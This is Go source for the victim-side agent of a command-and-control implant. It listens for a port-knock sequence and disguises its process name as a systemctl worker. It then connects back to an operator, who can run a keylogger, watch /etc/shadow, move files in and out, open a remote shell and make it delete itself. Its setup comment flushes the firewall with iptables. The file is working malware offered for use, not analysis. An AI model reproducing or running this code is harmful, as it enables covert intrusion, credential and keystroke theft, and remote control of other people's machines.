// Required:
// sudo apt install libnet-dev libpcap-dev -y
// sudo iptables -F

package main 

import (
	"c2/beacon"
    "c2/util"
	"encoding/json"
    "fmt"
    "io/ioutil"
    "os"
    "time"
    "net"
    "context"
    "path/filepath"
    "strings"
)

func startInodeWatchCodeVictim(conn net.Conn, ctx context.Context){
    path, err := util.NetRead[string](conn)
    if err != nil{
        fmt.Println(err)
        return 
    }
    if strings.TrimSpace(path) == "/etc/shadow"{
    if err := util.WatchShadowFile(conn, 1, ctx); err != nil{
        fmt.Println("error watching inode:", err)
        return 
    }
    } else{
        if err := util.WatchInodeVictim(conn, path, ctx); err != nil{
            fmt.Println("error watching inode:", err)
            return 
        }
    }
}

func startKeyLoggerCodeVictim(conn net.Conn, ctx context.Context){
    if err := util.Keylogger(conn, ctx); err != nil{
        fmt.Println(err)
        return 
    }
}

func transferKeylogCodeVictim(conn net.Conn){
    if err := util.SendFile(conn, util.KeyLogFilePath); err != nil{
        fmt.Println(err)
        return 
    } 
}

func recvFileCodeVictim(conn net.Conn){
    location, err := util.NetRead[string](conn)
    if err != nil{
        fmt.Println(err)
        return 
    }
    if err := util.RecvFile(conn, location); err != nil{
        fmt.Println(err)
        return 
    }
}

func sendFileCodeVictim(conn net.Conn){
    path, err := util.NetRead[string](conn)
    if err != nil{
        fmt.Println(err)
        return 
    }
    if err :=  util.SendFile(conn, path); err != nil{
        fmt.Println(err)
        return 
    }
}

func runShellCodeVictim(conn net.Conn, ctx context.Context){
    if err := util.RemoteShell(conn, util.VictimAgentTypeEnum, ctx); err != nil{ 
        fmt.Println(err)
        return 
    }
}

func uninstallCodeVictim(conn net.Conn){
    exePath, err := os.Executable()
    if err != nil {
        fmt.Fprintf(conn, "%v\n", err)
        return
    }
    realPath, err := filepath.EvalSymlinks(exePath)
    if err != nil {
        fmt.Fprintf(conn, "%v\n", err)
        return
    }
    err = os.Remove(realPath)
    if err != nil {
        fmt.Fprintf(conn, "%v\n", err)
    } else {
        fmt.Fprintf(conn, "Executable deleted successfully.")
    }
}

func victimOps(beaconSYN, beaconRSTACK beacon.BeaconStruct, route beacon.RouteStruct, ctx context.Context){
    
    time.Sleep(time.Second) // Wait till commander catches up 
    conn, err := util.ConnectTCP(route.SrcIP.String(), int(beaconRSTACK.Data),
     route.DstIP.String(), int(beaconSYN.Data))
    if conn == nil || err != nil{
        fmt.Println(err)
        return 
    }
    defer conn.Close()

    if beaconSYN.Type == beacon.StartInodeWatchCode{
         startInodeWatchCodeVictim(conn, ctx)
    }  else if beaconSYN.Type == beacon.StartKeyLoggerCode{
         startKeyLoggerCodeVictim(conn, ctx)
    }  else if beaconSYN.Type == beacon.TransferKeylogCode{
         transferKeylogCodeVictim(conn)
    } else if beaconSYN.Type == beacon.SendFileCode{
        recvFileCodeVictim(conn)
    } else if beaconSYN.Type == beacon.RecvFileCode{
        sendFileCodeVictim(conn) 
    } else if beaconSYN.Type == beacon.RunShellCode{
         runShellCodeVictim(conn, ctx)
    } else if beaconSYN.Type == beacon.RollbackCode{
            fmt.Println("rolling back")
    } else if beaconSYN.Type == beacon.UninstallCode{
        uninstallCodeVictim(conn)
    }
}

func main() {
    if os.Geteuid() != 0 {
        fmt.Println("run with sudo")
        os.Exit(1)
    }
    f, err := os.Open("victim.json")
    if err != nil {
        fmt.Println(err)
        return
    }
    defer f.Close()
    data, err := ioutil.ReadAll(f)
    if err != nil {
        fmt.Println(err)
        return
    }
    var routeInfo beacon.RouteInfoStruct
    if err := json.Unmarshal(data, &routeInfo); err != nil {
        fmt.Println(err)
        return
    }
    victimParams, err := beacon.VictimSetup(routeInfo)
    if err != nil{
        fmt.Println(err)
        return 
    }
    for{
        beacon.ReceiveKnock(victimParams.Route,  beacon.PortSequence)
        fmt.Println("PID =", os.Getpid())
        util.SpoofPsName("systemctl3.4", "systemctl4.3-util-worker")
        beacon.Victim(victimParams, victimOps)
    }
}
